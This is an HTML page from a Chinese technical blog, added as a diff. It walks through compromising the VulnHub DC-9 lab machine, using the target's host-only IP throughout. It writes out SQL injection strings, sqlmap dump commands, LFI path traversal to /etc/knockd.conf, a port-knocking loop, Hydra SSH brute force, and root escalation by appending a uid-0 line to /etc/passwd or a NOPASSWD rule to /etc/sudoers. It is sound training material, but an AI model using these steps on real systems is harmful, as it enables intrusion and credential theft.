@@ -1,0 +1,203 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="description" content="DC 系列第九台靶机：POST 型 SQL 注入拿到后台凭据，文件包含读出 knockd 配置，端口敲门放行 SSH，再用一个文件追加脚本把 root 权限写进系统文件。"><meta name="theme-color" content="#f2f4ef" data-theme-color><meta property="og:title" content="VulnHub DC-9 渗透实录：从 SQL 注入到端口敲门提权 · 浮光note"><meta property="og:description" content="DC 系列第九台靶机：POST 型 SQL 注入拿到后台凭据，文件包含读出 knockd 配置，端口敲门放行 SSH，再用一个文件追加脚本把 root 权限写进系统文件。"><meta property="og:image" content="https://wrhyija1379.github.io/fuguang-notes/images/post-vulnhub-dc9.webp"><meta property="og:image:alt" content="暗色终端中的 SQL 查询与端口扫描"><meta property="og:type" content="article"><meta property="og:url" content="https://wrhyija1379.github.io/fuguang-notes/posts/vulnhub-dc9/"><meta property="og:site_name" content="浮光note"><meta property="og:locale" content="zh_CN"><meta property="article:published_time" content="2026-10-08T00:00:00.000Z"><meta property="article:modified_time" content="2026-10-08T00:00:00.000Z"><meta property="article:section" content="技术"><meta property="article:tag" content="VulnHub"><meta property="article:tag" content="渗透测试"><meta property="article:tag" content="SQL注入"><meta property="article:tag" content="提权"><meta property="article:tag" content="端口敲门"><meta name="twitter:card" content="summary_large_image"><meta name="twitter:title" content="VulnHub DC-9 渗透实录：从 SQL 注入到端口敲门提权 · 浮光note"><meta name="twitter:description" content="DC 系列第九台靶机：POST 型 SQL 注入拿到后台凭据，文件包含读出 knockd 配置，端口敲门放行 SSH，再用一个文件追加脚本把 root 权限写进系统文件。"><meta name="twitter:image" content="https://wrhyija1379.github.io/fuguang-notes/images/post-vulnhub-dc9.webp"><meta name="twitter:image:alt" content="暗色终端中的 SQL 查询与端口扫描"><link rel="canonical" href="https://wrhyija1379.github.io/fuguang-notes/posts/vulnhub-dc9/"><link rel="alternate" type="application/rss+xml" title="浮光note RSS" href="https://wrhyija1379.github.io/fuguang-notes/rss.xml"><link rel="icon" href="https://wrhyija1379.github.io/fuguang-notes/favicon.svg" type="image/svg+xml"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","headline":"VulnHub DC-9 渗透实录：从 SQL 注入到端口敲门提权","description":"DC 系列第九台靶机：POST 型 SQL 注入拿到后台凭据，文件包含读出 knockd 配置，端口敲门放行 SSH，再用一个文件追加脚本把 root 权限写进系统文件。","image":"https://wrhyija1379.github.io/fuguang-notes/images/post-vulnhub-dc9.webp","url":"https://wrhyija1379.github.io/fuguang-notes/posts/vulnhub-dc9/","mainEntityOfPage":{"@type":"WebPage","@id":"https://wrhyija1379.github.io/fuguang-notes/posts/vulnhub-dc9/"},"datePublished":"2026-10-08T00:00:00.000Z","dateModified":"2026-10-08T00:00:00.000Z","author":{"@type":"Person","name":"Theologian25 · 愚者"},"publisher":{"@type":"Person","name":"Theologian25 · 愚者"},"inLanguage":"zh-CN","articleSection":"技术","keywords":["VulnHub","渗透测试","SQL注入","提权","端口敲门"]}</script><title>VulnHub DC-9 渗透实录：从 SQL 注入到端口敲门提权 · 浮光note</title><script>
+      (() => {
+        const key = "fuguang-theme";
+        const saved = localStorage.getItem(key);
+        const mode = saved === "light" || saved === "dark" ? saved : "system";
+        if (saved && mode === "system") localStorage.removeItem(key);
+        const theme = mode === "system" && matchMedia("(prefers-color-scheme: dark)").matches ? "dark" : mode === "system" ? "light" : mode;
+        document.documentElement.dataset.theme = theme;
+        document.documentElement.dataset.themeMode = mode;
+        document.documentElement.style.colorScheme = theme;
+        document.querySelector("[data-theme-color]")?.setAttribute("content", theme === "dark" ? "#101411" : "#f2f4ef");
+        matchMedia("(prefers-color-scheme: dark)").addEventListener("change", (event) => {
+          if (!localStorage.getItem(key)) {
+            const next = event.matches ? "dark" : "light";
+            document.documentElement.dataset.theme = next;
+            document.documentElement.style.colorScheme = next;
+            document.documentElement.dataset.themeMode = "system";
+            document.querySelector("[data-theme-color]")?.setAttribute("content", next === "dark" ? "#101411" : "#f2f4ef");
+          }
+        });
+      })();
+    </script><meta name="astro-view-transitions-enabled" content="true"><meta name="astro-view-transitions-fallback" content="animate"><script type="module" src="/fuguang-notes/_astro/ClientRouter.astro_astro_type_script_index_0_lang.FdJACmYA.js"></script><link rel="stylesheet" href="/fuguang-notes/_astro/BaseLayout.2WDGUwfL.css"></head><body><a class="skip-link" href="#main-content">跳到正文</a><header class="site-header" data-header><div class="header-inner shell"><a class="brand" href="/fuguang-notes/" aria-label="浮光note首页"><span class="brand-mark" aria-hidden="true">浮</span><span class="brand-copy"><strong>浮光note</strong><small>FUGUANG NOTE</small></span></a><nav class="desktop-nav" aria-label="主导航"><a href="/fuguang-notes/">首页</a><a href="/fuguang-notes/category/tech/">技术</a><a href="/fuguang-notes/category/life/">生活</a><a href="/fuguang-notes/category/reading/">读书</a><a href="/fuguang-notes/category/gaming/">游戏</a><a href="/fuguang-notes/archive/">归档</a><a href="/fuguang-notes/about/">关于</a></nav><div class="header-actions"><button class="search-trigger" type="button" data-search-open aria-label="搜索文章"><span class="search-symbol" aria-hidden="true"></span><span class="search-word">搜索</span></button><button class="icon-button theme-toggle" type="button" data-theme-toggle aria-label="切换主题"><span class="theme-icon theme-icon-system" aria-hidden="true">◐</span><span class="theme-icon theme-icon-light" aria-hidden="true">☼</span><span class="theme-icon theme-icon-dark" aria-hidden="true">☾</span></button><span class="sr-only" role="status" aria-live="polite" data-theme-status></span><button class="icon-button menu-toggle" type="button" data-menu-toggle aria-label="打开导航" aria-controls="mobile-navigation" aria-expanded="false"><span aria-hidden="true"></span></button></div></div><nav id="mobile-navigation" class="mobile-nav shell" data-mobile-nav aria-label="移动端导航" hidden><a href="/fuguang-notes/">首页</a><a href="/fuguang-notes/category/tech/">技术</a><a href="/fuguang-notes/category/life/">生活</a><a href="/fuguang-notes/category/reading/">读书</a><a href="/fuguang-notes/category/gaming/">游戏</a><a href="/fuguang-notes/archive/">归档</a><a href="/fuguang-notes/about/">关于</a></nav></header><dialog class="search-dialog" data-search-dialog aria-labelledby="search-dialog-title" aria-describedby="search-count"><div class="search-panel"><div class="search-head"><label id="search-dialog-title" for="site-search">搜索浮光note</label><button class="icon-button" type="button" data-search-close aria-label="关闭搜索" title="关闭">×</button></div><div class="search-field-wrap"><span class="search-symbol" aria-hidden="true"></span><input id="site-search" data-search-input type="search" placeholder="输入标题、标签或关键词" autocomplete="off" aria-controls="search-results" aria-describedby="search-count"></div><p id="search-count" class="search-count" data-search-count role="status" aria-live="polite" aria-atomic="true" data-total="9">全部 9 篇文章</p><div id="search-results" class="search-results" data-search-results aria-label="文章搜索结果"><div data-search-list></div><p class="search-empty" data-search-empty hidden>没有找到匹配的文章。</p></div></div></dialog><script type="module" src="/fuguang-notes/_astro/Header.astro_astro_type_script_index_0_lang.BiXcmGwk.js"></script><main id="main-content"><article class="article-page" style="--article-accent:#3ecf8e"><header class="article-hero"><img src="/fuguang-notes/images/post-vulnhub-dc9.webp" srcset="/fuguang-notes/images/post-vulnhub-dc9-480.webp 480w, /fuguang-notes/images/post-vulnhub-dc9-960.webp 960w, /fuguang-notes/images/post-vulnhub-dc9-1600.webp 1600w" sizes="100vw" width="1600" height="1000" alt="暗色终端中的 SQL 查询与端口扫描" loading="eager" decoding="async" fetchpriority="high"><div class="article-hero-overlay"></div><div class="shell article-hero-inner"><a class="article-category" href="/fuguang-notes/category/tech/">技术 · 编译现场</a><h1>VulnHub DC-9 渗透实录：从 SQL 注入到端口敲门提权</h1><p>DC 系列第九台靶机：POST 型 SQL 注入拿到后台凭据，文件包含读出 knockd 配置，端口敲门放行 SSH，再用一个文件追加脚本把 root 权限写进系统文件。</p><div class="article-meta"><time datetime="2026-10-08T00:00:00.000Z">2026/10/08</time><span>6 分钟阅读</span><span>VulnHub / 渗透测试 / SQL注入 / 提权 / 端口敲门</span></div></div></header><div class="shell article-layout"><aside class="article-aside"><a href="/fuguang-notes/">← 返回首页</a><div><span>本篇目录</span><ol><li><a href="#一信息收集">一、信息收集</a></li><li><a href="#11-主机发现">1.1 主机发现</a></li><li><a href="#12-端口扫描">1.2 端口扫描</a></li><li><a href="#二web-渗透--sql-注入">二、Web 渗透 —— SQL 注入</a></li><li><a href="#21-发现注入点">2.1 发现注入点</a></li><li><a href="#22-burpsuite-抓包">2.2 BurpSuite 抓包</a></li><li><a href="#23-sqlmap-爆破数据库">2.3 sqlmap 爆破数据库</a></li><li><a href="#三文件包含与-knockd-端口敲门">三、文件包含与 knockd 端口敲门</a></li><li><a href="#31-发现文件包含">3.1 发现文件包含</a></li><li><a href="#32-读取-knockd-配置">3.2 读取 knockd 配置</a></li><li><a href="#33-执行端口敲门">3.3 执行端口敲门</a></li><li><a href="#四ssh-爆破">四、SSH 爆破</a></li><li><a href="#41-构造字典">4.1 构造字典</a></li><li><a href="#42-hydra-爆破">4.2 Hydra 爆破</a></li><li><a href="#43-发现隐藏密码">4.3 发现隐藏密码</a></li><li><a href="#五提权">五、提权</a></li><li><a href="#51-分析-sudo-权限">5.1 分析 sudo 权限</a></li><li><a href="#52-分析-test-脚本">5.2 分析 test 脚本</a></li><li><a href="#53-利用-test-提权">5.3 利用 test 提权</a></li><li><a href="#54-获取-flag">5.4 获取 Flag</a></li><li><a href="#六攻击链总结">六、攻击链总结</a></li><li><a href="#七关键知识点">七、关键知识点</a></li><li><a href="#八易错点">八、易错点</a></li><li><a href="#九相关链接">九、相关链接</a></li></ol></div></aside><div class="article-main"><details class="mobile-toc"><summary>本篇目录 <span aria-hidden="true">＋</span></summary><ol><li><a href="#一信息收集">一、信息收集</a></li><li><a href="#11-主机发现">1.1 主机发现</a></li><li><a href="#12-端口扫描">1.2 端口扫描</a></li><li><a href="#二web-渗透--sql-注入">二、Web 渗透 —— SQL 注入</a></li><li><a href="#21-发现注入点">2.1 发现注入点</a></li><li><a href="#22-burpsuite-抓包">2.2 BurpSuite 抓包</a></li><li><a href="#23-sqlmap-爆破数据库">2.3 sqlmap 爆破数据库</a></li><li><a href="#三文件包含与-knockd-端口敲门">三、文件包含与 knockd 端口敲门</a></li><li><a href="#31-发现文件包含">3.1 发现文件包含</a></li><li><a href="#32-读取-knockd-配置">3.2 读取 knockd 配置</a></li><li><a href="#33-执行端口敲门">3.3 执行端口敲门</a></li><li><a href="#四ssh-爆破">四、SSH 爆破</a></li><li><a href="#41-构造字典">4.1 构造字典</a></li><li><a href="#42-hydra-爆破">4.2 Hydra 爆破</a></li><li><a href="#43-发现隐藏密码">4.3 发现隐藏密码</a></li><li><a href="#五提权">五、提权</a></li><li><a href="#51-分析-sudo-权限">5.1 分析 sudo 权限</a></li><li><a href="#52-分析-test-脚本">5.2 分析 test 脚本</a></li><li><a href="#53-利用-test-提权">5.3 利用 test 提权</a></li><li><a href="#54-获取-flag">5.4 获取 Flag</a></li><li><a href="#六攻击链总结">六、攻击链总结</a></li><li><a href="#七关键知识点">七、关键知识点</a></li><li><a href="#八易错点">八、易错点</a></li><li><a href="#九相关链接">九、相关链接</a></li></ol></details><div class="article-prose"><blockquote>
+<p><strong>靶机 IP 说明：</strong> 原文使用 <code>192.168.0.142</code>，这里统一替换为 <code>192.168.56.101</code>（VulnHub 常用 host-only 网段），实操时替换为你的靶机实际 IP。</p>
+</blockquote>
+<p>DC 系列是一组专门为渗透测试设计的易受攻击实验环境，共九个靶场，每个都藏着 Flag，需要一步步提权到 root。本文记录 DC-9 的完整过程。</p>
+<p>实验环境：攻击机 Kali Linux，靶机 DC-9，两台机器均设置为 NAT 模式。</p>
+<h2 id="一信息收集">一、信息收集</h2>
+<h3 id="11-主机发现">1.1 主机发现</h3>
+<p>先用 <code>arp-scan</code> 或 <code>netdiscover</code> 扫描存活主机：</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">arp-scan</span><span style="color:#79B8FF"> -l</span></span>
+<span class="line"><span style="color:#6A737D"># 或</span></span>
+<span class="line"><span style="color:#B392F0">netdiscover</span><span style="color:#79B8FF"> -r</span><span style="color:#9ECBFF"> 192.168.56.0/24</span></span></code></pre>
+<p>发现存活主机 <strong>192.168.56.101</strong>。</p>
+<h3 id="12-端口扫描">1.2 端口扫描</h3>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">nmap</span><span style="color:#79B8FF"> -sV</span><span style="color:#79B8FF"> -sC</span><span style="color:#79B8FF"> -p-</span><span style="color:#79B8FF"> 192.168.56.101</span></span></code></pre>
+<p>发现 <strong>80 端口开放，22 端口被 filtered</strong>。这里先记下一条线索：靶机可能用 <code>knockd</code> 把 22 端口关掉，需要按特定顺序访问端口序列后才会放行 SSH。</p>
+<h2 id="二web-渗透--sql-注入">二、Web 渗透 —— SQL 注入</h2>
+<h3 id="21-发现注入点">2.1 发现注入点</h3>
+<p>访问 <code>http://192.168.56.101</code>，点击导航栏的 <strong>Search</strong>，出现一个搜索框。先判断注入：</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="sql"><code><span class="line"><span style="color:#79B8FF">1</span><span style="color:#9ECBFF">' or 1=1#</span></span></code></pre>
+<p>搜索出大量结果，说明条件恒真。</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="sql"><code><span class="line"><span style="color:#79B8FF">1</span><span style="color:#9ECBFF">' or 1=2#</span></span></code></pre>
+<p>无结果返回，确认此处存在 <strong>SQL 注入</strong>。</p>
+<h3 id="22-burpsuite-抓包">2.2 BurpSuite 抓包</h3>
+<p>该注入点通过 POST 提交。用 BurpSuite 抓取 search 页面提交的数据，右键 → <strong>Copy to file</strong>，保存为 <code>dc9.txt</code>。</p>
+<h3 id="23-sqlmap-爆破数据库">2.3 sqlmap 爆破数据库</h3>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#6A737D"># 列出数据库</span></span>
+<span class="line"><span style="color:#B392F0">sqlmap</span><span style="color:#79B8FF"> -r</span><span style="color:#9ECBFF"> dc9.txt</span><span style="color:#79B8FF"> --dbs</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6A737D"># 列出 users 数据库中的表</span></span>
+<span class="line"><span style="color:#B392F0">sqlmap</span><span style="color:#79B8FF"> -r</span><span style="color:#9ECBFF"> dc9.txt</span><span style="color:#79B8FF"> -D</span><span style="color:#9ECBFF"> users</span><span style="color:#79B8FF"> --tables</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6A737D"># 列出表的字段</span></span>
+<span class="line"><span style="color:#B392F0">sqlmap</span><span style="color:#79B8FF"> -r</span><span style="color:#9ECBFF"> dc9.txt</span><span style="color:#79B8FF"> -D</span><span style="color:#9ECBFF"> users</span><span style="color:#79B8FF"> -T</span><span style="color:#9ECBFF"> UserDetails</span><span style="color:#79B8FF"> --columns</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6A737D"># 导出数据</span></span>
+<span class="line"><span style="color:#B392F0">sqlmap</span><span style="color:#79B8FF"> -r</span><span style="color:#9ECBFF"> dc9.txt</span><span style="color:#79B8FF"> -D</span><span style="color:#9ECBFF"> users</span><span style="color:#79B8FF"> -T</span><span style="color:#9ECBFF"> UserDetails</span><span style="color:#79B8FF"> --dump</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6A737D"># 列出 Staff 数据库中的数据</span></span>
+<span class="line"><span style="color:#B392F0">sqlmap</span><span style="color:#79B8FF"> -r</span><span style="color:#9ECBFF"> dc9.txt</span><span style="color:#79B8FF"> -D</span><span style="color:#9ECBFF"> Staff</span><span style="color:#79B8FF"> --tables</span></span>
+<span class="line"><span style="color:#B392F0">sqlmap</span><span style="color:#79B8FF"> -r</span><span style="color:#9ECBFF"> dc9.txt</span><span style="color:#79B8FF"> -D</span><span style="color:#9ECBFF"> Staff</span><span style="color:#79B8FF"> -T</span><span style="color:#9ECBFF"> Users</span><span style="color:#79B8FF"> --dump</span></span></code></pre>
+<p>拿到后台登录账号密码后，用 admin 账号登录后台。</p>
+<h2 id="三文件包含与-knockd-端口敲门">三、文件包含与 knockd 端口敲门</h2>
+<h3 id="31-发现文件包含">3.1 发现文件包含</h3>
+<p>登录后台后页面出现「文件不存在」的提示，怀疑存在文件包含漏洞。尝试读取文件，发现只能使用相对路径。</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#6A737D"># 用 BurpSuite Intruder / ffuf 爆破可包含的文件</span></span>
+<span class="line"><span style="color:#B392F0">ffuf</span><span style="color:#79B8FF"> -u</span><span style="color:#9ECBFF"> 'http://192.168.56.101/manage.php?file=FUZZ'</span><span style="color:#79B8FF"> -w</span><span style="color:#9ECBFF"> /usr/share/wordlists/dirb/common.txt</span></span></code></pre>
+<h3 id="32-读取-knockd-配置">3.2 读取 knockd 配置</h3>
+<p>结合前面 22 端口被 filtered 的线索，猜测使用了 <code>knockd</code>，通过文件包含读取它的配置：</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>?file=../../../../etc/knockd.conf</span></span></code></pre>
+<p>配置内容显示，需要<strong>依次触发三个端口</strong>才能开放 SSH：</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>[options]</span></span>
+<span class="line"><span>    UseSyslog</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>[openSSH]</span></span>
+<span class="line"><span>    sequence    = 7469,8475,9842</span></span>
+<span class="line"><span>    seq_timeout = 25</span></span>
+<span class="line"><span>    command     = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT &#x26;&#x26; /sbin/iptables -I OUTPUT -d %IP% -p tcp --sport 22 -j ACCEPT</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>[closeSSH]</span></span>
+<span class="line"><span>    sequence    = 9842,8475,7469</span></span>
+<span class="line"><span>    seq_timeout = 25</span></span>
+<span class="line"><span>    command     = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT &#x26;&#x26; /sbin/iptables -D OUTPUT -d %IP% -p tcp --sport 22 -j ACCEPT</span></span></code></pre>
+<h3 id="33-执行端口敲门">3.3 执行端口敲门</h3>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">nc</span><span style="color:#79B8FF"> 192.168.56.101</span><span style="color:#79B8FF"> 7469</span></span>
+<span class="line"><span style="color:#B392F0">nc</span><span style="color:#79B8FF"> 192.168.56.101</span><span style="color:#79B8FF"> 8475</span></span>
+<span class="line"><span style="color:#B392F0">nc</span><span style="color:#79B8FF"> 192.168.56.101</span><span style="color:#79B8FF"> 9842</span></span></code></pre>
+<p>或用一行命令：</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#F97583">for</span><span style="color:#E1E4E8"> port </span><span style="color:#F97583">in</span><span style="color:#9ECBFF"> 7469</span><span style="color:#9ECBFF"> 8475</span><span style="color:#9ECBFF"> 9842</span><span style="color:#E1E4E8">; </span><span style="color:#F97583">do</span><span style="color:#B392F0"> nc</span><span style="color:#79B8FF"> -w</span><span style="color:#79B8FF"> 1</span><span style="color:#79B8FF"> 192.168.56.101</span><span style="color:#E1E4E8"> $port; </span><span style="color:#F97583">done</span></span></code></pre>
+<p>再次扫描，发现 <strong>22 端口已开放</strong>：</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">nmap</span><span style="color:#79B8FF"> -p</span><span style="color:#79B8FF"> 22</span><span style="color:#79B8FF"> 192.168.56.101</span></span></code></pre>
+<h2 id="四ssh-爆破">四、SSH 爆破</h2>
+<h3 id="41-构造字典">4.1 构造字典</h3>
+<p>从之前 sqlmap 导出的 <code>users</code> 数据库中提取用户名和密码，建立用户名字典 <code>users.txt</code> 与密码字典 <code>pass.txt</code>。</p>
+<h3 id="42-hydra-爆破">4.2 Hydra 爆破</h3>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">hydra</span><span style="color:#79B8FF"> -L</span><span style="color:#9ECBFF"> users.txt</span><span style="color:#79B8FF"> -P</span><span style="color:#9ECBFF"> pass.txt</span><span style="color:#79B8FF"> 192.168.56.101</span><span style="color:#9ECBFF"> ssh</span></span></code></pre>
+<p>爆破出三个可登录账户，但登录后均无 sudo 权限。</p>
+<h3 id="43-发现隐藏密码">4.3 发现隐藏密码</h3>
+<p>登录 <code>janitor</code> 账户，在其家目录中发现隐藏目录，内含一个密码文件，里面的密码此前没有出现在数据库中。把它追加到 <code>pass.txt</code> 后再次爆破：</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">hydra</span><span style="color:#79B8FF"> -L</span><span style="color:#9ECBFF"> users.txt</span><span style="color:#79B8FF"> -P</span><span style="color:#9ECBFF"> pass.txt</span><span style="color:#79B8FF"> 192.168.56.101</span><span style="color:#9ECBFF"> ssh</span></span></code></pre>
+<p>新发现可登录账户 <strong>fredf</strong>。</p>
+<h2 id="五提权">五、提权</h2>
+<h3 id="51-分析-sudo-权限">5.1 分析 sudo 权限</h3>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">ssh</span><span style="color:#9ECBFF"> fredf@192.168.56.101</span></span>
+<span class="line"><span style="color:#B392F0">sudo</span><span style="color:#79B8FF"> -l</span></span></code></pre>
+<p>发现 fredf 可以 root 权限执行 <code>/opt/devstuff/test</code>。</p>
+<h3 id="52-分析-test-脚本">5.2 分析 test 脚本</h3>
+<p>查看源码：</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">cat</span><span style="color:#9ECBFF"> /opt/devstuff/test.py</span></span></code></pre>
+<p>该 Python 脚本的功能是：<strong>把参数 1 指定的文件内容追加到参数 2 指定的文件中</strong>。</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#6A737D">#!/usr/bin/python</span></span>
+<span class="line"><span style="color:#F97583">import</span><span style="color:#E1E4E8"> sys</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#F97583">if</span><span style="color:#79B8FF"> len</span><span style="color:#E1E4E8">(sys.argv) </span><span style="color:#F97583">!=</span><span style="color:#79B8FF"> 3</span><span style="color:#E1E4E8">:</span></span>
+<span class="line"><span style="color:#79B8FF">    print</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"Usage: python test.py read_file write_file"</span><span style="color:#E1E4E8">)</span></span>
+<span class="line"><span style="color:#E1E4E8">    sys.exit(</span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8">)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#F97583">with</span><span style="color:#79B8FF"> open</span><span style="color:#E1E4E8">(sys.argv[</span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8">], </span><span style="color:#9ECBFF">'r'</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">as</span><span style="color:#E1E4E8"> f:</span></span>
+<span class="line"><span style="color:#E1E4E8">    content </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> f.read()</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#F97583">with</span><span style="color:#79B8FF"> open</span><span style="color:#E1E4E8">(sys.argv[</span><span style="color:#79B8FF">2</span><span style="color:#E1E4E8">], </span><span style="color:#9ECBFF">'a'</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">as</span><span style="color:#E1E4E8"> f:</span></span>
+<span class="line"><span style="color:#E1E4E8">    f.write(content)</span></span></code></pre>
+<h3 id="53-利用-test-提权">5.3 利用 test 提权</h3>
+<p>思路很直接：既然能往任意文件以 root 权限追加内容，那就把构造好的用户信息追加到 <code>/etc/passwd</code>，或往 <code>/etc/sudoers</code> 写一条规则。</p>
+<p><strong>方案一：写入 /etc/passwd</strong></p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#6A737D"># 生成一个 root 权限用户的密码哈希</span></span>
+<span class="line"><span style="color:#B392F0">openssl</span><span style="color:#9ECBFF"> passwd</span><span style="color:#79B8FF"> -1</span><span style="color:#79B8FF"> -salt</span><span style="color:#9ECBFF"> newroot</span><span style="color:#9ECBFF"> password123</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6A737D"># 构造 passwd 条目</span></span>
+<span class="line"><span style="color:#79B8FF">echo</span><span style="color:#9ECBFF"> 'newroot:$1$newroot$hashvalue:0:0:root:/root:/bin/bash'</span><span style="color:#F97583"> ></span><span style="color:#9ECBFF"> /tmp/newuser</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6A737D"># 追加到 /etc/passwd</span></span>
+<span class="line"><span style="color:#B392F0">sudo</span><span style="color:#9ECBFF"> /opt/devstuff/test</span><span style="color:#9ECBFF"> /tmp/newuser</span><span style="color:#9ECBFF"> /etc/passwd</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6A737D"># 切换用户</span></span>
+<span class="line"><span style="color:#B392F0">su</span><span style="color:#9ECBFF"> newroot</span></span></code></pre>
+<p><strong>方案二：写入 /etc/sudoers</strong></p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#79B8FF">echo</span><span style="color:#9ECBFF"> 'fredf ALL=(ALL) NOPASSWD: ALL'</span><span style="color:#F97583"> ></span><span style="color:#9ECBFF"> /tmp/sudoers_append</span></span>
+<span class="line"><span style="color:#B392F0">sudo</span><span style="color:#9ECBFF"> /opt/devstuff/test</span><span style="color:#9ECBFF"> /tmp/sudoers_append</span><span style="color:#9ECBFF"> /etc/sudoers</span></span>
+<span class="line"><span style="color:#B392F0">sudo</span><span style="color:#79B8FF"> -i</span></span></code></pre>
+<h3 id="54-获取-flag">5.4 获取 Flag</h3>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">id</span></span>
+<span class="line"><span style="color:#6A737D"># uid=0(root) gid=0(root) groups=0(root)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#B392F0">cat</span><span style="color:#9ECBFF"> /root/flag.txt</span></span></code></pre>
+<p>提权成功！</p>
+<h2 id="六攻击链总结">六、攻击链总结</h2>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>主机发现 → 端口扫描 → Web 目录枚举</span></span>
+<span class="line"><span>    → SQL 注入（sqlmap dump 用户凭据）</span></span>
+<span class="line"><span>    → 后台登录 → 文件包含 → 读取 knockd 配置</span></span>
+<span class="line"><span>    → 端口敲门（nc）→ SSH 端口开放</span></span>
+<span class="line"><span>    → Hydra 爆破 SSH → janitor 隐藏密码 → 二次爆破 → fredf 登录</span></span>
+<span class="line"><span>    → sudo /opt/devstuff/test（文件追加）→ 写入 /etc/passwd 或 /etc/sudoers</span></span>
+<span class="line"><span>    → root → cat /root/flag.txt</span></span></code></pre>
+<h2 id="七关键知识点">七、关键知识点</h2>
+<table>
+<thead>
+<tr>
+<th>技术点</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>SQL 注入</td>
+<td>POST 型注入，sqlmap 自动化利用</td>
+</tr>
+<tr>
+<td>Knockd 端口敲门</td>
+<td>按序访问指定端口后才能开放 SSH</td>
+</tr>
+<tr>
+<td>文件包含（LFI）</td>
+<td>利用相对路径读取 <code>/etc/knockd.conf</code></td>
+</tr>
+<tr>
+<td>SSH 字典爆破</td>
+<td>Hydra 配合 sqlmap 导出的凭据字典</td>
+</tr>
+<tr>
+<td>信息收集</td>
+<td>janitor 家目录下的隐藏密码文件</td>
+</tr>
+<tr>
+<td>提权</td>
+<td>利用 sudo 权限的文件追加功能写入系统文件</td>
+</tr>
+</tbody>
+</table>
+<h2 id="八易错点">八、易错点</h2>
+<ol>
+<li><strong>knockd 端口敲门顺序不能错</strong>，必须是 <code>7469 → 8475 → 9842</code>。</li>
+<li><strong>文件包含只能用相对路径</strong>，绝对路径被过滤，需要 <code>../</code> 回溯到根目录。</li>
+<li><strong>janitor 的隐藏密码容易遗漏</strong>，需要用 <code>ls -la</code> 查看隐藏目录。</li>
+<li>写入 <code>/etc/passwd</code> 时注意保持文件格式正确；写入 <code>/etc/sudoers</code> 更直接，但注意不要破坏现有配置。</li>
+<li>端口敲门有超时（<code>seq_timeout = 25</code>），需在 25 秒内完成三个端口的访问。</li>
+</ol>
+<h2 id="九相关链接">九、相关链接</h2>
+<ul>
